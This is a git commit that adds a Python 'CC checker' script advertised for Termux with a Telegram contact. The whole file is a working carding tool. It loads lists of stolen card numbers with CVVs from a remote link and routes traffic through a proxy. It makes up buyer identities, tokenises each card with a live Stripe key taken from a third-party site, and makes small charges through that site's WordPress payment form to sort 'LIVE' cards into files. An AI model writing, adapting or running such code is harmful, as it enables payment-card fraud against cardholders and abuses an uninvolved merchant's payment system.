6b07658e4f97c805d1269a1b39d3f0b82e9cfd86
Nitin XD <nitinpandey194@gmail.com>
2023-03-25 13:44:24 +0000

    push

---
+++ main.py
@@ -0,0 +1,152 @@
+import random
+import string
+import requests
+import colorama
+import sys
+import time
+import io
+
+colorama.init(autoreset=True)
+
+sys.stdout.write(
+    f"""{colorama.Fore.BLUE}
+░█▀▀█ ░█▀▀█ 
+░█─── ░█─── 
+░█▄▄█ ░█▄▄█ 
+░█▀▀█ ░█─░█ ░█▀▀▀ ░█▀▀█ ░█─▄▀ ░█▀▀▀ ░█▀▀█ 
+░█─── ░█▀▀█ ░█▀▀▀ ░█─── ░█▀▄─ ░█▀▀▀ ░█▄▄▀ 
+░█▄▄█ ░█─░█ ░█▄▄▄ ░█▄▄█ ░█─░█ ░█▄▄▄ ░█─░█
+Welcome To Termux CC Checker.
+Contact me on tg @Xbinner2"""
+)
+
+# amount = int(input(f"\n{colorama.Fore.BLACK}Amount=> "))
+p = input("\nproxy remote=> ")
+s = requests.Session()
+proxies = {"http":p,"https":p}
+s.proxies.update(proxies)
+UA = "Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/107.0"
+
+
+def grab():
+    CC = input("\nlink combo➾ ")
+    cards = s.get(CC)
+    cc = cards.text.split("\n")
+    return cc
+
+
+def chk(CCN, MM, YY, CVV):
+    head = {
+        "user-agent": UA,
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/x-www-form-urlencoded",
+    }
+    r = s.post("https://m.stripe.com/6", headers=head)
+    Guid = r.json()["guid"]
+    Sid = r.json()["sid"]
+    Muid = r.json()["muid"]
+    time.sleep(1)
+
+    res = s.get(f"https://randomuser.me/api?nat=US").json()
+    for x in res["results"]:
+        First = x["name"]["first"]
+        Last = x["name"]["last"]
+        Street = (
+            f"{x['location']['street']['name']} {x['location']['street']['number']}"
+        )
+        City = x["location"]["city"]
+        State = x["location"]["state"]
+        Zip = x["location"]["postcode"]
+        Name = f"{First} {Last}"
+        Email = f"{First}.{Last}@gmail.com"
+
+    HEADER = {
+        "accept": "application/json",
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": UA,
+        "accept-language": "en-US,en;q=0.9",
+    }
+
+    postdata = {
+        "guid": Guid,
+        "muid": Muid,
+        "sid": Sid,
+        "key": "pk_live_8nHNgurCsBkFZNukDOLgJ13T",
+        "card[number]": int(CCN),
+        "card[cvc]": int(CVV),
+        "card[exp_month]": MM,
+        "card[exp_year]": int(YY),
+    }
+
+    token = s.post("https://api.stripe.com/v1/tokens", data=postdata, headers=HEADER)
+    Id = token.json()["id"]
+    TYPE = token.json()["card"]["funding"]
+    BRAND = token.json()["card"]["brand"]
+    COU = token.json()["card"]["country"]
+    time.sleep(1)
+
+    load = {
+        "action": "wp_full_stripe_payment_charge",
+        "formName": "PaymentForm",
+        "fullstripe_name": Name,
+        "fullstripe_email": Email,
+        "fullstripe_custom_amount": "2",
+        "fullstripe_address_line1": Street,
+        "fullstripe_address_city": City,
+        "fullstripe_address_state": State,
+        "fullstripe_address_zip": Zip,
+        "stripeToken": Id,
+    }
+
+    header = {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "user-agent": UA,
+        "accept-language": "en-US,en;q=0.9",
+    }
+
+    rx = s.post(
+        "https://signaturedjs.com/wp-admin/admin-ajax.php", headers=header, data=load
+    )
+    msg = rx.json()["msg"]
+
+    if "true" in rx.text:
+        sys.stdout.write(
+            f"\n{colorama.Fore.GREEN}LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
+        )
+        with io.open("LIVES.txt", "a") as f:
+            f.write(f"LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n")
+
+    if "security code" in rx.text:
+        sys.stdout.write(
+            f"\n{colorama.Fore.BLUE}CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
+        )
+        with io.open("CCN.txt", "a") as f:
+            f.write(f"CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n")
+
+    else:
+        sys.stdout.write(
+            f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
+        )
+
+
+def main():
+    CARDS = grab()
+    sys.stdout.write(f"\n{colorama.Fore.BLUE}TOTAL CC: {len(CARDS)}\n")
+    for i in CARDS:
+        CCN = i.split("|")[0]
+        MM = i.split("|")[1]
+        YY = i.split("|")[2]
+        CVV = i.split("|")[3]
+        try:
+            chk(CCN, MM, YY, CVV)
+            time.sleep(0.5)
+        except:
+            pass
+    print(
+        f"\n{colorama.Fore.BLUE}FINISHED! Process done! Checked {colorama.Fore.RED}{len(CARDS)} Tasks\n"
+    )
+
+
+if __name__ == "__main__":
+    main()
